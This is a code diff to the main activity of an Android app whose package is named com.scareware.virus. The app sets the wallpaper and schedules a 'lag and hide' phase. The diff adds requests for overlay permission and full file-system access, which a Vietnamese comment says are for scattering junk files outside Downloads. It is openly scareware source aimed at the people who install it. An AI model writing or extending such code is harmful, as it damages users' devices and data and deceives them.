@@ -1,7 +1,9 @@
 package com.scareware.virus
 
+import android.Manifest
 import android.app.WallpaperManager
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.BitmapFactory
 import android.graphics.Color
 import android.media.AudioAttributes
@@ -10,6 +12,7 @@ import android.media.RingtoneManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
 import android.os.Handler
 import android.os.Looper
 import android.os.VibrationEffect
@@ -24,6 +27,8 @@ import android.widget.ImageView
 import android.widget.LinearLayout
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import kotlin.random.Random
 
 class MainActivity : AppCompatActivity() {
@@ -62,11 +67,23 @@ class MainActivity : AppCompatActivity() {
             if (bmp != null) wm.setBitmap(bmp)
         } catch (_: Exception) {}
 
-        // Overlay permission for flash / popup
+        // Quyền overlay
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-                val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
+                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
+            }
+        } catch (_: Exception) {}
+
+        // Quyền All files (để file rác hiện ngoài Downloads)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
+                val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                i.data = Uri.parse("package:$packageName")
                 startActivity(i)
+            } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+                if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                    ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE), 100)
+                }
             }
         } catch (_: Exception) {}
 
@@ -132,7 +149,6 @@ class MainActivity : AppCompatActivity() {
             handler.postDelayed({ startLagAndHide() }, 3000)
         }
 
-        // Sau 20s chuyển sang phase lag mạnh
         handler.postDelayed({ startLagAndHide() }, 20000)
     }
 
